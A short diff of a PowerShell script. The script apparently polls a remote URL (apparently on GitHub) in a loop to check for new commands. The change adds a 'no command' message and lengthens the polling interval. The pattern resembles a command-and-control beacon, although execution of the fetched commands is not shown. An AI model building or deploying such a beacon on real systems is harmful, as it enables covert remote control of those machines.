@@ -370,6 +370,7 @@ while($true){
 $response = Invoke-RestMethod -Uri $GHurl
 
     if ($response -match "$previouscmd") {
+    write-output "No command found.."
     }
     else{
     Write-Output "Command found!"
@@ -417,6 +418,6 @@ $response = Invoke-RestMethod -Uri $GHurl
         }
     
     }
-sleep 10
+sleep 15
 }
 
